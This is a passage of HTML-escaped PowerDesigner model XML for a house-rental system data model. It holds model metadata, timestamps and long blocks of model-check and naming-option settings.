Id=&quot;o55&quot;&gt;&lt;a:ObjectID&gt;5609460D-01D0-4355-AFBA-D95ECFDDDAB3&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325546&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618334211&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetModelURL&gt;file:///%_EXAMPLES%/我的项目/房屋租赁系统.ldm&lt;/a:TargetModelURL&gt;&lt;a:TargetModelID&gt;E0CA7255-710D-4C0F-8906-045A9AB7CB75&lt;/a:TargetModelID&gt;&lt;a:TargetModelClassID&gt;5F45F978-C4F3-4E35-A3FC-AF3318663A0F&lt;/a:TargetModelClassID&gt;&lt;a:TargetModelLastModificationDate&gt;1618333034&lt;/a:TargetModelLastModificationDate&gt;&lt;c:SessionShortcuts&gt;&lt;o:Shortcut Ref=&quot;o3&quot;/&gt;&lt;/c:SessionShortcuts&gt;&lt;/o:TargetModel&gt;&lt;/c:TargetModels&gt;&lt;/o:Model&gt;&lt;/c:Children&gt;&lt;/o:RootObject&gt;&lt;/Model&gt; LDM &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;?PowerDesigner AppLocale=&quot;UTF16&quot; ID=&quot;&#123;E0CA7255-710D-4C0F-8906-045A9AB7CB75&#125;&quot; Label=&quot;&quot; LastModificationDate=&quot;1618333034&quot; Name=&quot;房屋租赁系统&quot; Objects=&quot;111&quot; Symbols=&quot;17&quot; Type=&quot;&#123;5F45F978-C4F3-4E35-A3FC-AF3318663A0F&#125;&quot; signature=&quot;LDM_DATA_MODEL_XML&quot; version=&quot;16.6.1.5066&quot;?&gt;&lt;!--不要编辑此文件--&gt;&lt;Model xmlns:a=&quot;attribute&quot; xmlns:c=&quot;collection&quot; xmlns:o=&quot;object&quot;&gt;&lt;o:RootObject Id=&quot;o1&quot;&gt;&lt;c:Children&gt;&lt;o:Model Id=&quot;o2&quot;&gt;&lt;a:ObjectID&gt;E0CA7255-710D-4C0F-8906-045A9AB7CB75&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325542&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;8FDD11B2-37EE-4B1A-B801-2D3A7E259451&#125;DAT 1618325546ATT MOPTATT FOPT&lt;/a:History&gt;&lt;a:PackageOptionsText&gt;[FolderOptions][FolderOptions\\Common]GenerationCheckModel=YesGenerationPath=GenerationOptions=GenerationTasks=GenerationTargets=GenerationSelections=[FolderOptions\\CheckModel][FolderOptions\\CheckModel\\Package][FolderOptions\\CheckModel\\Package\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\CheckPackageMissTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\DefaultCheckPackageMissTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\GenrCircularityYes]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\GenrCircularityNo]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Package\\ShortcutUniqCode]CheckSeverity=YesFixRequested=NoCheckRequested=No[FolderOptions\\CheckModel\\Package\\ChildShortcut]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain][FolderOptions\\CheckModel\\Domain\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckNumParam]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckPrecSupLng]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckUndefDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckOtherDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Domain\\CheckDttpIncompatibleFormat]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity][FolderOptions\\CheckModel\\Entity\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\MaxLen - NAME]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\MaxLen - CODE]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EmptyColl - PENTCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttNbSerials]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EmptyColl - IDTFCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EmptyCollYesYes]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttSamePrnt]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttMultInhr]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\EnttSevInhr]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity\\PidtfInhrAtt]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute][FolderOptions\\CheckModel\\Entity.Entity Attribute\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\AttrDiffDomn]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckNumParam]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckPrecSupLng]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckUndefDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckOtherDttp]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Entity Attribute\\CheckDttpIncompatibleFormat]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier][FolderOptions\\CheckModel\\Entity.Identifier\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\EmptyColl - PENTCOL]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\CheckIncludeColl - Entt]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Entity.Identifier\\IdtfChildPIdtf]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship][FolderOptions\\CheckModel\\Relationship\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshReflexiveDeptYes]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshReflexiveDeptNo]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshBject]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Relationship\\RlshMany]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance][FolderOptions\\CheckModel\\Inheritance\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\EmptyColl - CHILDCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Inheritance\\InhrComplete]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Replication][FolderOptions\\CheckModel\\Replication\\PartialReplication]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule][FolderOptions\\CheckModel\\Business Rule\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Business Rule\\EmptyColl - OBJCOL]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object][FolderOptions\\CheckModel\\Extended Object\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Object\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link][FolderOptions\\CheckModel\\Extended Link\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Extended Link\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File][FolderOptions\\CheckModel\\File\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\File\\CheckPathExists]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format][FolderOptions\\CheckModel\\Data Format\\CheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\CheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\DefaultCheckUseOnlyTerms]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\DefaultCheckUseTermBySynonym]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\NotApprovedTerms]CheckSeverity=YesFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\UniqueName]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\UniqueCode]CheckSeverity=NoFixRequested=NoCheckRequested=Yes[FolderOptions\\CheckModel\\Data Format\\CheckDataFormatNullExpression]CheckSeverity=NoFixRequested=NoCheckRequested=Yes&lt;/a:PackageOptionsText&gt;&lt;a:ModelOptionsText&gt;[ModelOptions][ModelOptions\\Logical options]CaseSensitive=NoDisplayName=YesEnableTrans=NoUseTerm=NoEnableRequirements=NoEnableFullShortcut=YesSynchroCode=YesNotation=0RlshUnique=YesDefaultDttp=DomnCopyDttp=YesDomnCopyChck=NoDomnCopyRule=NoDomnCopyExat=NoDomnCopyMand=NoDttpFullName=YesRlshMigrateDomain=YesRlshMigrateCheck=YesRlshMigrateRule=YesRlshMigrateExtd=YesRlshAllowInhrDivr=NoRlshAllowNN=NoRlshGenNN=NoFKNameTemplate=%.3:PARENT%_%ATTRIBUTE%FKNameTemplateUsage=NoRlshAsstTmpl=Each %Entity1.Name%[CRLF].if %Entity1ToEntity2RoleMandatory%[CRLF] must[CRLF].else[CRLF] may[CRLF].endif[CRLF].if %Entity1ToEntity2Role%[CRLF] %.L:Entity1ToEntity2Role%[CRLF].else[CRLF] have[CRLF].endif[CRLF].if %Entity1ToEntity2RoleMaximumCardinality%==1[CRLF].if %Entity1ToEntity2RoleMandatory%[CRLF] one and only one[CRLF].else[CRLF] at most one[CRLF].endif[CRLF].else[CRLF] one or more[CRLF].endif[CRLF].if %Entity1%==%Entity2%[CRLF] other[CRLF].endif[CRLF] %Entity2.Name%.[CRLF]Each %Entity2.Name%[CRLF].if %Entity2ToEntity1RoleMandatory%[CRLF] must[CRLF].else[CRLF] may[CRLF].endif[CRLF].if %Entity2ToEntity1Role%[CRLF] %.L:Entity2ToEntity1Role%[CRLF].else[CRLF] have[CRLF].endif[CRLF].if %Entity2ToEntity1RoleMaximumCardinality%==1[CRLF].if %Entity2ToEntity1RoleMandatory%[CRLF] one and only one[CRLF].else[CRLF] at most one[CRLF].endif[CRLF].else[CRLF] one or more[CRLF].endif[CRLF].if %Entity1%==%Entity2%[CRLF] other[CRLF].endif[CRLF] %Entity1.Name%.RlshAsstExt=[ModelOptions\\Logical options\\NamingOptionsTemplates][ModelOptions\\Logical options\\ClssNamingOptions][ModelOptions\\Logical options\\ClssNamingOptions\\FILO][ModelOptions\\Logical options\\ClssNamingOptions\\FILO\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\FILO\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\FRMEOBJ][ModelOptions\\Logical options\\ClssNamingOptions\\FRMEOBJ\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\FRMEOBJ\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\FRMELNK][ModelOptions\\Logical options\\ClssNamingOptions\\FRMELNK\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\FRMELNK\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\DefaultClass][ModelOptions\\Logical options\\ClssNamingOptions\\DefaultClass\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\DefaultClass\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMPCKG][ModelOptions\\Logical options\\ClssNamingOptions\\LDMPCKG\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMPCKG\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMDOMN][ModelOptions\\Logical options\\ClssNamingOptions\\LDMDOMN\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMDOMN\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMENTT][ModelOptions\\Logical options\\ClssNamingOptions\\LDMENTT\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMENTT\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMPROP][ModelOptions\\Logical options\\ClssNamingOptions\\LDMPROP\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMPROP\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMIDTF][ModelOptions\\Logical options\\ClssNamingOptions\\LDMIDTF\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMIDTF\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMRLSH][ModelOptions\\Logical options\\ClssNamingOptions\\LDMRLSH\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMRLSH\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMINHR][ModelOptions\\Logical options\\ClssNamingOptions\\LDMINHR\\Name]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Logical options\\ClssNamingOptions\\LDMINHR\\Code]Template=MaxLen=254Case=MValidChar=InvldChar=AllValid=YesNoAccent=NoDefaultChar=Script=ConvTable=ConvTablePath=%_HOME%\\Resource Files\\Conversion Tables[ModelOptions\\Generate][ModelOptions\\Generate\\Cdm]CheckModel=YesSaveLinks=YesNameToCode=No[ModelOptions\\Generate\\Pdm]CheckModel=YesSaveLinks=YesNameToCode=NoBuildTrgr=NoTablePrefix=%Code%IndxPKName=%TABLE%_PKIndxAKName=%TABLE%_AKIndxFKName=%REFR%_FKIndxThreshold=PreserveMode=YesEnableTransformations=NoColumnPrefix=%Code%DomainPrefix=%Code%RulePrefix=%Code%RefrUpdRule=RestrictRefrDelRule=RestrictColnFKName=%.3:PARENT%_%COLUMN%ColnFKNameUse=No&lt;/a:ModelOptionsText&gt;&lt;a:RepositoryFilename&gt;%_EXAMPLES%\\我的项目\\房屋租赁系统.ldm&lt;/a:RepositoryFilename&gt;&lt;c:GeneratedModels&gt;&lt;o:Shortcut Id=&quot;o3&quot;&gt;&lt;a:ObjectID&gt;0ECB3C44-6346-4853-8DA5-D5625AEFCC74&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetStereotype/&gt;&lt;a:TargetID&gt;1F49DC66-529B-454F-8F5F-AC9E437B7E95&lt;/a:TargetID&gt;&lt;a:TargetClassID&gt;CDE44E21-9669-11D1-9914-006097355D9B&lt;/a:TargetClassID&gt;&lt;/o:Shortcut&gt;&lt;/c:GeneratedModels&gt;&lt;c:GenerationOrigins&gt;&lt;o:Shortcut Id=&quot;o4&quot;&gt;&lt;a:ObjectID&gt;9FEE1EC5-602F-4B2B-B490-DBD3B7A165D5&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租赁系统&lt;/a:Name&gt;&lt;a:Code&gt;房屋租赁系统&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618325546&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325546&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:TargetStereotype/&gt;&lt;a:TargetID&gt;8FDD11B2-37EE-4B1A-B801-2D3A7E259451&lt;/a:TargetID&gt;&lt;a:TargetClassID&gt;1E597170-9350-11D1-AB3C-0020AF71E433&lt;/a:TargetClassID&gt;&lt;/o:Shortcut&gt;&lt;/c:GenerationOrigins&gt;&lt;c:LogicalDiagrams&gt;&lt;o:LogicalDiagram 